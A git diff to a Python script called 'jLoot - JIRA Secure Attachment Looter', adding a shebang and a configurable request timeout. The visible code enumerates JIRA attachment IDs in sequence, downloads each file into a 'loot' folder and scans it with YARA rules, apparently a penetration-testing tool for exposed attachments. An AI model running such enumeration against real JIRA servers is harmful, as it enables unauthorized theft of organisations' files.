@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+
 import urllib.request
 from socket import timeout
 import argparse
@@ -7,10 +9,12 @@ import yara
 parser = argparse.ArgumentParser(description='jLoot - JIRA Secure Attachment Looter')
 parser.add_argument('-u',action='store',dest='jURL', help="JIRA Base URL")
 parser.add_argument('-s',action='store',dest='startf',type=int, help="Start File")
+parser.add_argument('-t',action='store',dest='timeoutf',type=int, default=2, help="Request timeout amount. Default: 2")
 parser.add_argument('-l',action='store',dest='flimit',type=int, help="File Limit")
 parser.add_argument('-o',action='store',dest='outdir', help="Output Directory - Default 'loot/'")
 parser.add_argument('-y',action='store',dest='yaraRules', help="Custom Yara Rules")
 args = parser.parse_args()
+timeoutf = args.timeoutf
 startf = args.startf
 flimit = args.flimit
 jURL = args.jURL
@@ -36,7 +40,7 @@ while i < flimit:
     fileNum = str(startf+i)
     try:
         url = attachURL+fileNum+'/'
-        response = urllib.request.urlopen(url,timeout=2)
+        response = urllib.request.urlopen(url,timeout=timeoutf)
         fileName = response.headers.get_filename()
         data = response.read()
         if fileName != None:
